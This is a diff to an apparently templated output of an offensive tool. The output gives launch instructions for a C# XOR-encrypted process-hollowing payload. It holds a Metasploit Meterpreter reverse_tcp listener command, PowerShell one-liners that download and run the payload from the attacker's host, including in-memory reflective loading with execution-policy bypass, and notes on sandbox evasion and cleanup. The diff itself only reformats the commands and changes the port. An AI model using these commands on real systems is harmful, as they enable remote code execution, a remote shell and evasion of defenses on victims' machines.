@@ -99,15 +99,15 @@ output:
     C# XOR Process Hollowing - Launch Instructions
 
     Start Listener:
-    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
+    $ msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
 
     Transfer and Execute:
-    python3 -m http.server 8080
-    On target: powershell -c "IWR -Uri http://{{ lhost }}:8080/{{ output_file }} -OutFile {{ output_file }}; Start-Process {{ output_file }}"
+    $ python3 -m http.server 80
+    $ powershell -c "IWR -Uri http://{{ lhost }}/{{ output_file }} -OutFile {{ output_file }}; Start-Process {{ output_file }}"
 
     In-Memory Execution:
-    python3 -m http.server 8080
-    On target: powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}:8080/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [ProcessHollowing.Program]::Main(@())"
+    $ python3 -m http.server 80
+    $ powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [ProcessHollowing.Program]::Main(@())"
 
     Notes:
     - XOR encrypted with key: 0x{{ xor_key }}
@@ -131,8 +131,8 @@ output:
 
     Cleanup:
     On target:
-    taskkill /F /IM svchost.exe /FI "PID eq [PID]" 2>nul
-    del {{ output_file }}
+    $ taskkill /F /IM svchost.exe /FI "PID eq [PID]" 2>nul
+    $ del {{ output_file }}
     - Payload waits 10 seconds before execution (sandbox evasion)
     - Requires x64 Windows system
     - svchost.exe must exist at C:\Windows\System32\svchost.exe
@@ -149,4 +149,4 @@ output:
     Cleanup:
 
     After testing, remove the payload:
-    Remove-Item {{ output_file }} -Force
+    $ Remove-Item {{ output_file }} -Force
